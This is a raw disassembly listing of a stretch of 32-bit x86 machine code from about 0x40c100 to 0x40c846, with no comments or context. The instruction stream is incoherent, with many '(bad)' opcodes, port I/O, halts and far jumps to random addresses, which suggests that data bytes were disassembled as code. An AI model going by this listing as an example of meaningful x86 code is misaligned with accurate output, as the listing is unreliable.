  40c100:	push   ebx
  40c101:	dec    ebx
  40c102:	dec    ebx
  40c103:	mov    BYTE PTR [ecx-0x80],ch
  40c106:	or     DWORD PTR [ebx],esp
  40c108:	out    0xfa,eax
  40c10a:	daa    
  40c10b:	lahf   
  40c10c:	xchg   ebp,eax
  40c10d:	mov    DWORD PTR ds:0x179039d6,edi
  40c113:	push   esp
  40c114:	add    eax,0xabfd93a5
  40c119:	push   esi
  40c11a:	dec    ecx
  40c11b:	or     al,0xdc
  40c11d:	cwde   
  40c11e:	jge    0x40c0fc
  40c120:	adc    eax,DWORD PTR [edx+0x23981b3c]
  40c126:	sub    ebp,DWORD PTR [ecx+edx*1-0x32bccaa1]
  40c12d:	sahf   
  40c12e:	adc    BYTE PTR [ecx+0x53],0xf8
  40c132:	mov    DWORD PTR [ecx],edx
  40c134:	dec    ebx
  40c135:	mov    ecx,DWORD PTR [ecx]
  40c137:	add    bh,dh
  40c139:	push   0x39
  40c13b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c13c:	ret    0x98ad
  40c13f:	xchg   DWORD PTR [ebx-0x55],edi
  40c142:	leave  
  40c143:	dec    esi
  40c144:	push   esp
  40c145:	sahf   
  40c146:	in     al,0x68
  40c148:	xor    esp,DWORD PTR [ebp+0x2abf8f68]
  40c14e:	inc    esp
  40c14f:	ds mov eax,0x3098846a
  40c155:	data16 cld 
  40c157:	push   edx
  40c158:	repnz mov ds:0x9478c079,al
  40c15e:	gs mov dl,0x62
  40c161:	adc    dh,BYTE PTR [esi]
  40c163:	(bad)  
  40c164:	xchg   esp,eax
  40c165:	out    dx,eax
  40c166:	push   edi
  40c167:	jno    0x40c19d
  40c169:	mov    al,0xec
  40c16b:	leave  
  40c16c:	push   eax
  40c16d:	mov    ch,0x79
  40c16f:	fidiv  WORD PTR cs:[eax-0x80]
  40c175:	cmp    DWORD PTR [edx+0x23],0x6a
  40c179:	imul   eax,DWORD PTR [edx],0x68c2c2b5
  40c17f:	fld    QWORD PTR [esi-0x24]
  40c182:	sub    eax,0x56e9626c
  40c187:	loopne 0x40c184
  40c189:	pop    ebp
  40c18a:	repnz rcr DWORD PTR [ecx+0x69],1
  40c18e:	xchg   ebx,eax
  40c18f:	scas   al,BYTE PTR es:[edi]
  40c190:	and    eax,0x4ad02a6d
  40c195:	pop    ecx
  40c196:	sbb    al,al
  40c198:	xor    eax,0x9417b900
  40c19d:	mov    al,ds:0x697f22d3
  40c1a2:	cwde   
  40c1a3:	std    
  40c1a4:	xchg   ebx,eax
  40c1a5:	rcr    BYTE PTR ds:0x6643e6de,1
  40c1ab:	nop
  40c1ac:	and    BYTE PTR [ebx-0x27],0xfe
  40c1b0:	xchg   esp,eax
  40c1b1:	sub    edi,ebp
  40c1b3:	sbb    DWORD PTR [ecx],esi
  40c1b5:	mov    ds:0x9542f1cb,al
  40c1ba:	mov    ebp,0xef7653ab
  40c1bf:	mov    bh,BYTE PTR [ebx-0x56aad8e]
  40c1c5:	push   0xffffffd3
  40c1c7:	popf   
  40c1c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1c9:	mov    BYTE PTR [eax+0x798d1a36],ch
  40c1cf:	loop   0x40c162
  40c1d1:	sub    DWORD PTR [ebx],ecx
  40c1d3:	cld    
  40c1d4:	ds in  eax,dx
  40c1d6:	jae    0x40c1f3
  40c1d8:	jl     0x40c194
  40c1da:	dec    ebp
  40c1db:	mov    al,0x36
  40c1dd:	xchg   DWORD PTR [ecx-0x1ba4ace8],ebp
  40c1e3:	jns    0x40c248
  40c1e5:	int3   
  40c1e6:	aaa    
  40c1e7:	repz out 0x32,al
  40c1ea:	xchg   ebx,eax
  40c1eb:	outs   dx,BYTE PTR ds:[esi]
  40c1ec:	push   ebx
  40c1ed:	xchg   ebp,eax
  40c1ee:	rcl    BYTE PTR [eax-0x61],0x86
  40c1f2:	xor    al,0xdb
  40c1f4:	push   ebx
  40c1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f6:	push   ebx
  40c1f7:	jne    0x40c1a5
  40c1f9:	or     esi,DWORD PTR [ebp+0x694eadef]
  40c1ff:	pop    ecx
  40c200:	je     0x40c1eb
  40c202:	scas   al,BYTE PTR es:[edi]
  40c203:	and    dl,BYTE PTR [edx+0x18]
  40c206:	test   al,dl
  40c208:	push   ebx
  40c209:	std    
  40c20a:	sub    BYTE PTR [edx],ch
  40c20c:	clc    
  40c20d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c20e:	ds xchg edi,eax
  40c210:	lds    ebp,FWORD PTR [ebx+0x18]
  40c213:	mov    al,0xd
  40c215:	fisubr WORD PTR [eax+eiz*4]
  40c218:	mov    edi,DWORD PTR [ecx-0x3eadccc1]
  40c21e:	adc    bh,dh
  40c220:	adc    al,0xfa
  40c222:	nop
  40c223:	sbb    eax,ebx
  40c225:	inc    ebx
  40c226:	arpl   WORD PTR [ebx],bx
  40c228:	add    esi,edi
  40c22a:	cmp    BYTE PTR [edi+0x795f559c],al
  40c230:	push   edx
  40c231:	shl    ecx,0xf3
  40c234:	adc    dh,cl
  40c236:	hlt    
  40c237:	sub    DWORD PTR [edi],0xffffffc6
  40c23a:	lock fdiv st,st(1)
  40c23d:	push   ss
  40c23e:	out    0xe5,al
  40c240:	mov    edx,0xe270e95c
  40c245:	jmp    DWORD PTR [ebx-0x22]
  40c248:	lahf   
  40c249:	fst    QWORD PTR [esi+0x7d]
  40c24c:	push   ebx
  40c24d:	stc    
  40c24e:	enter  0x4782,0xf2
  40c252:	cmp    BYTE PTR [eax-0x2627bdca],bh
  40c258:	push   ebp
  40c259:	mov    esp,0xb9c2eaec
  40c25e:	jns    0x40c238
  40c260:	sub    esp,ecx
  40c262:	icebp  
  40c263:	(bad)  
  40c264:	xchg   esi,eax
  40c265:	shl    BYTE PTR [edi+0x1b],0x98
  40c269:	sub    DWORD PTR [bx+si+0x3822],ecx
  40c26e:	jecxz  0x40c1f3
  40c270:	push   ebx
  40c271:	fild   DWORD PTR [eax]
  40c273:	or     al,0x2a
  40c275:	inc    edx
  40c276:	mov    edi,0x1048fa4b
  40c27b:	fdivr  DWORD PTR [ebp-0x17]
  40c27e:	(bad)  
  40c27f:	lods   al,BYTE PTR ds:[esi]
  40c280:	sahf   
  40c281:	jg     0x40c2ed
  40c283:	mov    ds:0xe36ef653,eax
  40c288:	clc    
  40c289:	inc    ecx
  40c28a:	mov    edx,0xa93bbf86
  40c28f:	(bad)  
  40c290:	inc    ecx
  40c291:	cwde   
  40c292:	cs adc al,0x49
  40c295:	call   DWORD PTR [ecx]
  40c297:	pop    ds
  40c298:	xlat   BYTE PTR ds:[ebx]
  40c299:	lahf   
  40c29a:	sub    ax,si
  40c29d:	dec    ebp
  40c29e:	xor    eax,0x1715507b
  40c2a3:	sbb    edx,DWORD PTR [eax+0x2f9cac0c]
  40c2a9:	daa    
  40c2aa:	test   eax,0xd4c353f4
  40c2af:	fcomi  st,st(1)
  40c2b1:	and    DWORD PTR [edx],ebp
  40c2b3:	adc    al,0x55
  40c2b5:	ror    BYTE PTR [ebx+0x30c2d32f],cl
  40c2bb:	mov    ds:0x96dd73e4,al
  40c2c0:	repnz ins DWORD PTR es:[edi],dx
  40c2c2:	jno    0x40c2db
  40c2c4:	inc    edi
  40c2c5:	fld    TBYTE PTR [esi-0x63]
  40c2c8:	push   edx
  40c2c9:	jmp    0x40c260
  40c2cb:	mov    al,ds:0xa66a0a7
  40c2d0:	xor    DWORD PTR [edx*2+0x44735bba],0x18
  40c2d8:	adc    dh,BYTE PTR [eax+ebp*1]
  40c2db:	inc    edi
  40c2dc:	sbb    BYTE PTR [eax],ch
  40c2de:	jno    0x40c2ff
  40c2e0:	mov    bl,0xa7
  40c2e2:	cld    
  40c2e3:	pop    ds
  40c2e4:	xor    BYTE PTR [ebx+0x57064303],dh
  40c2ea:	dec    ebp
  40c2eb:	aam    0xfe
  40c2ed:	xchg   DWORD PTR [ebx-0x2c],ebx
  40c2f0:	fisubr DWORD PTR [edx+0x18d7e8ad]
  40c2f6:	jns    0x40c2d6
  40c2f8:	sub    DWORD PTR [eax-0x6],esi
  40c2fb:	call   0x2b3:0xd5bf93f8
  40c302:	dec    esp
  40c303:	(bad)  
  40c304:	out    dx,al
  40c305:	stos   BYTE PTR es:[edi],al
  40c306:	test   eax,0x661d95a9
  40c30b:	call   0xee26:0xf47c3fd2
  40c312:	mov    edx,0xd89093a8
  40c317:	sbb    ebx,ecx
  40c319:	ret    0x86ad
  40c31c:	dec    esp
  40c31d:	sub    al,0xa4
  40c31f:	fist   DWORD PTR [ebx+0x43]
  40c322:	xchg   ecx,eax
  40c323:	or     DWORD PTR [ebp+0x3696fd10],ebx
  40c329:	push   0xffffffe5
  40c32b:	sub    BYTE PTR [eax+0x3f],al
  40c32e:	xchg   esp,eax
  40c32f:	cmc    
  40c330:	outs   dx,BYTE PTR ds:[esi]
  40c331:	sub    BYTE PTR [edx],bh
  40c333:	loope  0x40c33a
  40c335:	imul   esi,ebx,0xffffffe5
  40c338:	mov    ebp,0x78f8a2b4
  40c33d:	imul   edi,DWORD PTR [edx],0xa9c96922
  40c343:	push   es
  40c344:	rcl    BYTE PTR [ecx+0x49ec66],cl
  40c34a:	nop
  40c34b:	bound  ecx,QWORD PTR [edi-0x33e6d7f3]
  40c351:	inc    sp
  40c353:	stc    
  40c354:	std    
  40c355:	jl     0x40c361
  40c357:	lock push esp
  40c359:	push   0xa1cb9115
  40c35e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c35f:	mov    bl,0xa3
  40c361:	fisub  WORD PTR [edi+0x67]
  40c364:	push   esi
  40c365:	push   0xffffff9b
  40c367:	lahf   
  40c368:	(bad)  [eax+0x6f01997f]
  40c36e:	dec    ecx
  40c36f:	pop    esp
  40c370:	xor    DWORD PTR [edx-0x72a0659c],edx
  40c376:	jp     0x40c352
  40c378:	into   
  40c379:	sub    ecx,DWORD PTR ds:0xb96cd309
  40c37f:	cmp    al,0x83
  40c381:	into   
  40c382:	jne    0x40c3f4
  40c384:	push   ebx
  40c385:	jnp    0x40c340
  40c387:	push   eax
  40c388:	adc    cl,bl
  40c38a:	ss ret 0x6b19
  40c38e:	pop    ecx
  40c38f:	frstor [ebp-0x619e97cb]
  40c395:	pop    eax
  40c396:	outs   dx,DWORD PTR ds:[si]
  40c398:	mov    ds:0x9ba85d88,al
  40c39d:	mov    dl,0x19
  40c39f:	arpl   WORD PTR [edi-0x707db796],si
  40c3a5:	cli    
  40c3a6:	(bad)  
  40c3a7:	cmp    esp,DWORD PTR [ecx]
  40c3a9:	push   ds
  40c3aa:	add    eax,0x65cec5e3
  40c3af:	popa   
  40c3b0:	ds (bad) 
  40c3b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3b3:	jmp    0xb8cbd791
  40c3b8:	pop    ss
  40c3b9:	inc    edi
  40c3ba:	in     al,dx
  40c3bb:	mov    ebx,0x738b694e
  40c3c0:	pop    ebx
  40c3c1:	fldenv [esi+ebx*8+0x6b]
  40c3c5:	dec    eax
  40c3c6:	enter  0xeb9c,0xcb
  40c3ca:	(bad)  
  40c3cb:	(bad)  
  40c3cc:	inc    esi
  40c3cd:	mov    eax,ds:0x9a474dda
  40c3d2:	inc    ebx
  40c3d3:	or     BYTE PTR [ebx+0x31],ah
  40c3d6:	bound  esi,QWORD PTR [ebp+ebx*4-0x16]
  40c3da:	xchg   esp,eax
  40c3db:	loopne 0x40c3ef
  40c3dd:	ins    BYTE PTR es:[edi],dx
  40c3de:	inc    ecx
  40c3df:	and    BYTE PTR es:[ebx+0x6b161d85],dh
  40c3e6:	cmp    esp,DWORD PTR [ecx+eax*2+0x50515849]
  40c3ed:	jno    0x40c468
  40c3ef:	push   0x3126a6a7
  40c3f4:	cld    
  40c3f5:	test   DWORD PTR [ecx],0x64eae1b
  40c3fb:	push   edi
  40c3fc:	push   edx
  40c3fd:	scas   eax,DWORD PTR es:[edi]
  40c3fe:	xor    eax,0x5681bd2b
  40c403:	stos   DWORD PTR es:[edi],eax
  40c404:	push   ebx
  40c405:	xchg   edx,eax
  40c406:	mov    ecx,0xd95ca2f1
  40c40b:	inc    ebx
  40c40c:	jmp    0xfa94777b
  40c411:	vhsubpd xmm5,xmm6,XMMWORD PTR [eax+0x3ba37b76]
  40c419:	inc    ebx
  40c41a:	jl     0x40c477
  40c41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c41d:	sub    dl,bl
  40c41f:	sbb    al,0x27
  40c421:	sar    BYTE PTR [ebx],1
  40c423:	adc    BYTE PTR [ebx-0x5],0x38
  40c427:	dec    eax
  40c428:	in     eax,0xa2
  40c42a:	pop    ecx
  40c42b:	in     al,dx
  40c42c:	add    ebx,esi
  40c42e:	push   eax
  40c42f:	stos   DWORD PTR es:[edi],eax
  40c430:	retf   0x664b
  40c433:	mov    fs,ecx
  40c435:	aas    
  40c436:	dec    esi
  40c437:	sbb    cl,BYTE PTR [eax+0x21aa296a]
  40c43d:	ins    BYTE PTR es:[edi],dx
  40c43e:	(bad)  
  40c43f:	std    
  40c440:	sbb    DWORD PTR ds:0xa2fd5fdb,eax
  40c446:	test   DWORD PTR [ebx],edi
  40c448:	push   ebx
  40c449:	nop
  40c44a:	leave  
  40c44b:	cmp    ch,BYTE PTR [esi-0x2f83dee6]
  40c451:	push   0x42
  40c453:	addr16 repz fs dec esi
  40c457:	dec    ebx
  40c458:	(bad)  
  40c45a:	das    
  40c45b:	jmp    0xfb5:0x8ed305f1
  40c462:	mov    ch,0xf9
  40c464:	retf   0xbdaf
  40c467:	(bad)  
  40c468:	xor    cl,dh
  40c46a:	sub    ebp,DWORD PTR [ebx-0x2791906c]
  40c470:	fcom   QWORD PTR [edx+0x515344a2]
  40c476:	fwait
  40c477:	or     al,0xba
  40c479:	mov    ah,ah
  40c47b:	adc    DWORD PTR [ecx+0x6b],esp
  40c47e:	bound  ebx,QWORD PTR [esi]
  40c480:	mov    al,0x4c
  40c482:	(bad)  
  40c483:	in     al,dx
  40c484:	mov    dl,0x11
  40c486:	nop
  40c487:	xor    DWORD PTR [esi],ebx
  40c489:	and    BYTE PTR [edi+0x1f],0xf3
  40c48d:	pop    esp
  40c48e:	jbe    0x40c41b
  40c490:	mov    dh,0x8
  40c492:	dec    esi
  40c493:	imul   ebp,DWORD PTR [esi],0x63
  40c496:	mov    BYTE PTR [edi-0x556d9405],0x3c
  40c49d:	cwde   
  40c49e:	arpl   WORD PTR [ebp-0x7d],dx
  40c4a1:	mov    cl,0x26
  40c4a3:	push   edx
  40c4a4:	test   BYTE PTR [esi-0x33],bh
  40c4a7:	sbb    DWORD PTR [esi+0x67],eax
  40c4aa:	mov    ebp,0xb1b38b4
  40c4af:	mov    ds:0x884689a6,eax
  40c4b4:	inc    ebx
  40c4b5:	pop    edx
  40c4b6:	dec    eax
  40c4b7:	cmp    esp,esp
  40c4b9:	cmp    BYTE PTR [eax+edi*4+0x5d],bl
  40c4bd:	js     0x40c440
  40c4bf:	push   ecx
  40c4c0:	stos   BYTE PTR es:[edi],al
  40c4c1:	shl    BYTE PTR [edx],cl
  40c4c3:	lods   al,BYTE PTR ds:[esi]
  40c4c4:	push   eax
  40c4c5:	sbb    DWORD PTR [eax-0x6395e976],esp
  40c4cb:	xlat   BYTE PTR ds:[ebx]
  40c4cc:	xor    edx,eax
  40c4ce:	or     eax,0x730553a9
  40c4d3:	stc    
  40c4d4:	push   esp
  40c4d5:	cmp    al,dl
  40c4d7:	mov    dh,0x5e
  40c4d9:	add    BYTE PTR [ecx+eax*4-0x57],bl
  40c4dd:	jb     0x40c4fc
  40c4df:	pop    ebx
  40c4e0:	mov    eax,0x5080ebb4
  40c4e5:	lea    ebp,[edi]
  40c4e7:	xor    eax,0x31a125cd
  40c4ec:	jb     0x40c53b
  40c4ee:	call   FWORD PTR [ecx]
  40c4f0:	bound  edi,QWORD PTR [esp+ebp*2-0x38]
  40c4f4:	mov    bh,0x9d
  40c4f6:	mov    BYTE PTR [edx],dh
  40c4f8:	push   edx
  40c4f9:	inc    eax
  40c4fa:	jns    0x40c48b
  40c4fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4fd:	sbb    cl,dh
  40c4ff:	ds add ecx,0xffffffec
  40c503:	pushf  
  40c504:	mov    BYTE PTR [ecx+0x15],ch
  40c507:	into   
  40c508:	jb     0x40c4f1
  40c50a:	adc    al,0x2e
  40c50c:	lods   al,BYTE PTR ds:[esi]
  40c50d:	icebp  
  40c50e:	data16 ins BYTE PTR es:[edi],dx
  40c510:	and    ebp,edx
  40c512:	cli    
  40c513:	jmp    0x40c569
  40c515:	(bad)  
  40c516:	push   0xffffffd7
  40c518:	or     esi,DWORD PTR [edi+eiz*4-0x52]
  40c51c:	pop    ecx
  40c51d:	stos   BYTE PTR es:[edi],al
  40c51e:	xchg   ecx,eax
  40c51f:	inc    esp
  40c520:	out    dx,eax
  40c521:	push   esp
  40c522:	lods   ax,WORD PTR ds:[esi]
  40c524:	test   DWORD PTR [ebx+0x78],0x365a8c20
  40c52b:	shr    BYTE PTR [edx],1
  40c52d:	leave  
  40c52e:	aas    
  40c52f:	es ud2 
  40c532:	and    bl,dl
  40c534:	inc    ebx
  40c535:	ds clc 
  40c537:	enter  0xfd66,0xa6
  40c53b:	adc    bl,0x31
  40c53e:	fistp  QWORD PTR [edi-0x29cd4908]
  40c544:	dec    ebx
  40c545:	push   eax
  40c546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c547:	adc    al,0xcc
  40c549:	out    dx,al
  40c54a:	mov    esi,0xca167d05
  40c54f:	out    dx,eax
  40c550:	xor    DWORD PTR [ebx-0x5f],ebp
  40c553:	push   edi
  40c554:	mov    dh,BYTE PTR [edx]
  40c556:	sub    bl,cl
  40c558:	push   0xed4ea24f
  40c55d:	push   0xfffffffd
  40c55f:	or     ch,0xec
  40c562:	sub    dl,ch
  40c564:	push   ebx
  40c565:	pop    edi
  40c566:	cdq    
  40c567:	xchg   edi,eax
  40c568:	inc    ebp
  40c569:	fcmove st,st(3)
  40c56b:	adc    BYTE PTR [eax+0x70380d07],bl
  40c571:	adc    ah,cl
  40c573:	jge    0x40c5db
  40c575:	in     eax,0x8a
  40c577:	clc    
  40c578:	shr    DWORD PTR [ecx+0x1420f387],cl
  40c57e:	xor    BYTE PTR [ecx],bl
  40c580:	jnp    0x40c57d
  40c582:	lahf   
  40c583:	sub    BYTE PTR [eax-0x4f],cl
  40c586:	cdq    
  40c587:	stos   BYTE PTR es:[edi],al
  40c588:	push   ebx
  40c589:	icebp  
  40c58a:	les    edx,FWORD PTR [esi-0x6d]
  40c58d:	xchg   esp,eax
  40c58e:	mov    edx,DWORD PTR [eax+0x25f6955]
  40c594:	mov    esi,0xe999cf96
  40c599:	push   edi
  40c59a:	add    WORD PTR [esi],ax
  40c59d:	sbb    esi,DWORD PTR [esi]
  40c59f:	fist   DWORD PTR [eax]
  40c5a1:	sub    al,0x96
  40c5a3:	mov    edx,0x1b008373
  40c5a8:	pop    esi
  40c5a9:	sbb    eax,0x17be50d9
  40c5ae:	retw   
  40c5b0:	(bad)  
  40c5b1:	data16 mov al,0xc9
  40c5b4:	jno    0x40c59a
  40c5b6:	pop    esi
  40c5b7:	lock xor DWORD PTR [esi+0x69909cac],0xf1628bc6
  40c5c2:	xor    BYTE PTR [esi+0x46],bl
  40c5c5:	inc    ebp
  40c5c6:	popfw  
  40c5c8:	jmp    0xfc3d:0xff0fe5b8
  40c5cf:	sbb    DWORD PTR [eax-0x1c37b2e4],esi
  40c5d5:	jl     0x40c5fb
  40c5d7:	mov    al,ds:0xa42ebd53
  40c5dc:	inc    esp
  40c5dd:	push   ss
  40c5de:	jo     0x40c5ae
  40c5e0:	out    0x6a,al
  40c5e2:	sub    ecx,DWORD PTR [esi+ebx*1+0x2d2a4d5a]
  40c5e9:	les    ebp,FWORD PTR [eax+0x7e613537]
  40c5ef:	cmc    
  40c5f0:	gs leave 
  40c5f2:	mov    eax,ds:0xede3d499
  40c5f7:	shr    BYTE PTR [ebx],cl
  40c5f9:	imul   ecx,DWORD PTR [edi],0x11
  40c5fc:	cmc    
  40c5fd:	(bad)  
  40c5fe:	jae    0x40c617
  40c600:	mov    eax,ds:0xe9d72afc
  40c605:	jmp    0x2ddd:0xa16e0813
  40c60c:	aaa    
  40c60d:	push   0x54
  40c60f:	mov    dl,0x62
  40c611:	inc    edi
  40c612:	retf   0x5218
  40c615:	jg     0x40c65f
  40c617:	rcr    dh,0x61
  40c61a:	(bad)  
  40c61b:	stc    
  40c61c:	enter  0xd45c,0xdc
  40c620:	dec    ecx
  40c621:	push   0x8
  40c623:	sub    DWORD PTR [eax],ecx
  40c625:	add    DWORD PTR [edi+0x79a3a6a3],eax
  40c62b:	xchg   ecx,eax
  40c62c:	sub    BYTE PTR ds:0xa214add1,ah
  40c632:	sub    ebx,DWORD PTR [ecx]
  40c634:	mov    bh,0xe5
  40c636:	cmc    
  40c637:	or     DWORD PTR [eax],ecx
  40c639:	fcom   QWORD PTR [ecx+0x7ab5355]
  40c63f:	push   esi
  40c640:	xchg   edx,eax
  40c641:	shr    BYTE PTR [edi-0x1dfb8f1e],1
  40c647:	popa   
  40c648:	and    ecx,DWORD PTR [edi+0x3e]
  40c64b:	adc    DWORD PTR [ebx],eax
  40c64d:	adc    DWORD PTR [ecx+0x3c4253a2],edx
  40c653:	lea    esp,[edx-0x3dc8faa0]
  40c659:	push   0xc
  40c65b:	pop    es
  40c65c:	idiv   BYTE PTR ds:[edx+0x4e]
  40c660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c661:	and    bh,BYTE PTR [esi]
  40c663:	sar    DWORD PTR [eax],1
  40c665:	push   0x60
  40c667:	cld    
  40c668:	adc    al,bl
  40c66a:	xor    eax,0xd96c16b4
  40c66f:	pop    ebp
  40c670:	jb     0x40c656
  40c672:	shl    BYTE PTR [edi-0x41445d01],1
  40c678:	mov    esi,0xea2b66aa
  40c67d:	in     eax,dx
  40c67e:	add    al,BYTE PTR [ecx+0x45]
  40c681:	inc    edx
  40c682:	outs   dx,BYTE PTR ds:[esi]
  40c683:	test   DWORD PTR [esi+0x15fedf69],0x1f1e36e7
  40c68d:	xor    ebp,DWORD PTR [ebx]
  40c68f:	repnz add BYTE PTR [edx-0xd73b95c],al
  40c696:	xchg   esi,eax
  40c697:	cs ret 0xb41a
  40c69b:	sbb    DWORD PTR [edi-0x3b],ebp
  40c69e:	dec    eax
  40c69f:	pushf  
  40c6a0:	xchg   dx,ax
  40c6a2:	xchg   esp,eax
  40c6a3:	arpl   WORD PTR [ebx-0x8],dx
  40c6a6:	push   edx
  40c6a7:	cmp    eax,ebx
  40c6a9:	pop    edx
  40c6aa:	pop    eax
  40c6ab:	(bad)  
  40c6ac:	jbe    0x40c640
  40c6ae:	mov    ebx,0xaba4c719
  40c6b3:	xchg   edx,eax
  40c6b4:	lock dec ecx
  40c6b6:	mov    cl,0xd7
  40c6b8:	mov    BYTE PTR [ebp+0xd],bh
  40c6bb:	cwde   
  40c6bc:	dec    ecx
  40c6bd:	mov    ds:0xa23ced3a,eax
  40c6c2:	push   ss
  40c6c3:	jl     0x40c700
  40c6c5:	pop    ss
  40c6c6:	outs   dx,DWORD PTR ds:[esi]
  40c6c7:	sbb    al,bh
  40c6c9:	dec    ebx
  40c6ca:	clc    
  40c6cb:	or     cl,dl
  40c6cd:	jle    0x40c6c6
  40c6cf:	enter  0x7486,0xd5
  40c6d3:	sbb    DWORD PTR [esi+0x31],ebp
  40c6d6:	or     esi,DWORD PTR [ebx+0x15]
  40c6d9:	hlt    
  40c6da:	jb     0x40c6b2
  40c6dc:	leave  
  40c6dd:	mov    al,ds:0xbd67ef28
  40c6e2:	test   eax,0x483c4e21
  40c6e7:	mul    BYTE PTR [edi]
  40c6e9:	pop    esp
  40c6ea:	(bad)  
  40c6ec:	xor    dh,0xde
  40c6ef:	and    al,0xa0
  40c6f1:	imul   esi,DWORD PTR [edx],0x6e11ecfb
  40c6f7:	ins    DWORD PTR es:[edi],dx
  40c6f8:	ja     0x40c6a9
  40c6fa:	fs inc edx
  40c6fc:	inc    ebx
  40c6fd:	or     ah,BYTE PTR [ebx-0x58]
  40c700:	push   esi
  40c701:	adc    DWORD PTR [eax-0x6c],ebp
  40c704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c705:	imul   ecx,DWORD PTR [ebx+0x76],0x551361aa
  40c70c:	pushf  
  40c70d:	in     al,0x19
  40c70f:	push   edi
  40c710:	loopne 0x40c763
  40c712:	out    0x1,al
  40c714:	jl     0x40c71b
  40c716:	loopne 0x40c6e1
  40c718:	hlt    
  40c719:	push   0x30
  40c71b:	jg     0x40c6a7
  40c71d:	add    edx,DWORD PTR [ecx]
  40c71f:	pusha  
  40c720:	outs   dx,BYTE PTR ds:[esi]
  40c721:	adc    al,0x66
  40c723:	dec    ebp
  40c724:	ins    BYTE PTR es:[edi],dx
  40c725:	jae    0x40c745
  40c727:	call   0x19eda279
  40c72c:	mov    gs,WORD PTR [ecx+0x2fbb3215]
  40c732:	or     eax,0x22cf5334
  40c737:	scas   al,BYTE PTR es:[edi]
  40c738:	jbe    0x40c6bc
  40c73a:	nop
  40c73b:	sub    eax,0x3e1269af
  40c740:	xchg   edx,eax
  40c741:	ror    DWORD PTR fs:[ecx-0x1e],0xac
  40c746:	addr16 sbb al,0x8
  40c749:	dec    ebx
  40c74a:	sub    BYTE PTR [esi+ebp*4+0xa],0x1b
  40c74f:	mov    cl,BYTE PTR [ebx-0x27]
  40c752:	xchg   DWORD PTR ds:0x4be86ae1,esi
  40c758:	jbe    0x40c6e4
  40c75a:	sbb    edx,DWORD PTR [edi+eiz*2-0x16]
  40c75e:	push   di
  40c760:	jle    0x40c71a
  40c762:	jmp    0x591b:0x749a1699
  40c769:	hlt    
  40c76a:	mov    dh,0x8e
  40c76c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c76d:	fisub  WORD PTR [ecx-0x1a]
  40c770:	push   ebx
  40c771:	jbe    0x40c77b
  40c773:	pop    esi
  40c774:	pop    edx
  40c775:	adc    esp,DWORD PTR [ebx+ebx*2+0xe301914]
  40c77c:	xor    al,0x98
  40c77e:	xor    DWORD PTR [esi-0x7e],ebp
  40c781:	mov    ebx,esi
  40c783:	ror    DWORD PTR [ebx+0x75],0x79
  40c787:	pop    ebx
  40c788:	xchg   edi,eax
  40c789:	in     al,dx
  40c78a:	ret    0xfed3
  40c78d:	mov    cl,0x29
  40c78f:	cmp    BYTE PTR [ebx+0x51f7ca9f],dl
  40c795:	dec    BYTE PTR [esi+0x6b1c4815]
  40c79b:	push   edi
  40c79c:	and    BYTE PTR [edi-0x27],ch
  40c79f:	jmp    0x3994d94d
  40c7a4:	add    BYTE PTR [ebx+0x4eb1635e],0x11
  40c7ab:	into   
  40c7ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7ad:	jmp    0x14ee492c
  40c7b2:	pop    esi
  40c7b3:	(bad)  
  40c7b4:	push   ebx
  40c7b5:	stc    
  40c7b6:	leave  
  40c7b7:	stos   BYTE PTR es:[edi],al
  40c7b8:	call   DWORD PTR [ecx+0x1a]
  40c7bb:	test   eax,0xeb926aed
  40c7c0:	test   al,0x1d
  40c7c2:	pop    es
  40c7c3:	hlt    
  40c7c4:	std    
  40c7c5:	nop
  40c7c6:	data16 mov ds:0xcc1fefe4,al
  40c7cc:	and    eax,edi
  40c7ce:	sub    BYTE PTR [ecx],bl
  40c7d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d1:	add    DWORD PTR [ebx+0x60484c4],esp
  40c7d7:	jl     0x40c82b
  40c7d9:	xor    BYTE PTR [ebx-0x48],dl
  40c7dc:	jns    0x40c7c0
  40c7de:	stos   BYTE PTR es:[edi],al
  40c7df:	test   al,0x47
  40c7e1:	aaa    
  40c7e2:	sub    al,0x39
  40c7e4:	and    ah,al
  40c7e6:	sub    BYTE PTR [edi-0x4bc094fe],al
  40c7ec:	ja     0x40c7ab
  40c7ee:	ins    DWORD PTR es:[edi],dx
  40c7ef:	add    al,0xb
  40c7f1:	les    esp,FWORD PTR [esi-0x27]
  40c7f4:	jle    0x40c7f7
  40c7f6:	jl     0x40c7dc
  40c7f8:	lea    eax,[edi+0x4]
  40c7fb:	sbb    ecx,DWORD PTR [ecx-0x23]
  40c7fe:	jno    0x40c7d8
  40c800:	pop    ebp
  40c801:	jle    0x40c786
  40c803:	xchg   DWORD PTR [ebx+0x7d],edx
  40c806:	mov    bl,0x8b
  40c808:	(bad)  
  40c809:	outs   dx,BYTE PTR ds:[esi]
  40c80a:	cmp    BYTE PTR [ecx],al
  40c80c:	pop    es
  40c80d:	dec    edi
  40c80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c80f:	push   0x5
  40c811:	ret    0x5321
  40c814:	jnp    0x40c82f
  40c816:	test   eax,0x44d32b3b
  40c81b:	inc    edx
  40c81c:	test   DWORD PTR [esi+0x107d198c],eax
  40c822:	pop    ecx
  40c823:	xchg   ecx,eax
  40c824:	imul   esi,DWORD PTR [edx-0x70],0x527199ab
  40c82b:	push   edi
  40c82c:	adc    ebp,esp
  40c82e:	cmp    cl,BYTE PTR [edx-0x37990adb]
  40c834:	or     al,0xb
  40c836:	mov    edx,0x68d1f94e
  40c83b:	(bad)  
  40c83c:	sbb    bl,ah
  40c83e:	sub    BYTE PTR [edx+0x50],dl
  40c841:	adc    BYTE PTR [esi+0x35],al
  40c844:	sbb    ecx,esi
  40c846:	data16 jp 0x40c805
